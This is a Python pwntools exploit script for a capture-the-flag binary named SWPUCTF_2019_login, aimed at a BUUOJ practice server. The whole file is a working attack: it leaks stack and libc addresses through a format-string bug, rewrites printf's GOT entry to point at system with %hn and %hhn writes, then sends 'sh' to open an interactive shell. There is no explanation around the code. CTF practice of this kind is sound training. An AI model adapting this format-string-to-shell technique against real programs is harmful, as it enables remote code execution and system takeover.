# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './SWPUCTF_2019_login'
elf = ELF(binary)
#libc = elf.libc
libc = ELF("./libc/libc-2.27-32.so")
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '29784'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a          : int( p.recv(len(str(a)))[2:] , 16)
def dbg():
    gdb.attach(p)
    pause()

def bgdb(fun):
    gdb.attach(p,"b %s"%fun)

def cmd(num):
    sla('>',num)

gadget = [0x3cbea,0x3cbec,0x3cbf0,0x6729f,0x672a0,0x13573e,0x13573f]
printf_got = elf.got["printf"]

sla("your name:","niyah")

payload =  "niyah%6$p,%15$p"
sla("password:",payload)

ru("niyah")

stack_addr = rint("0xfff424b8") -0x10
ru(",")
__libc_start_main  = rint("0xf7f7e9b0") - 241

libc.address = __libc_start_main - libc.sym["__libc_start_main"]
system = libc.sym["system"]

lg("stack_addr",stack_addr)
lg("printf_got",printf_got)

payload ="%" + str( (stack_addr  + 12 )& 0xffff ) + "c%6$hn"
sla("Try again!",payload)

payload ="%" + str( ( printf_got )& 0xffff ) + "c%10$hn"
sla("Try again!",payload)

payload ="%" + str( (stack_addr  + 20 )& 0xffff ) + "c%6$hn"
sla("Try again!",payload)

#bgdb("printf")

payload ="%" + str( ( printf_got + 2 )& 0xffff ) + "c%10$hn"
sla("Try again!",payload)

num1 = (system >> 4*4) & 0xff
num2 = (system & 0xffff ) - num1

lg("system",system)
lg("num1",num1)
lg("num2",num2 )

payload = "%" +str(num1) +  "c%11$hhn" + "%" +str(num2 ) +"c%9$hn"
sla("Try again!",payload)

sla("Try again!","sh\x00")


p.interactive()

'''
@File    :   SWPUCTF_2019_login.py
@Time    :   2021/07/18 11:31:26
@Author  :   Niyah 
'''